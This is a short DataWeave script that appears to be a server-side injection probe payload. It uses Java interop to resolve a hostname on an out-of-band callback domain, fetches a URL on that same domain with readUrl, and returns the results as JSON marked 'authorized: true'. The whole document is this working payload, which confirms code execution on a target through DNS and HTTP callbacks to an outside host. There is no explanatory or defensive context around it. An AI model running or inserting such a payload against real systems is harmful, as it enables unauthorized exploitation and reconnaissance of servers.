%dw 2.0
import java!java::net::InetAddress
output application/json
var dnsProbe = InetAddress::getByName("grvw-saiqvbbo9bg--claydwjava1.oob.an1me.sh")
var httpProbe = readUrl("http://n-ginvwdctmxqr4c--claydwread1.oob.an1me.sh/dataweave", "text/plain")
---
{
  authorized: true,
  dns: dnsProbe,
  http: httpProbe
}
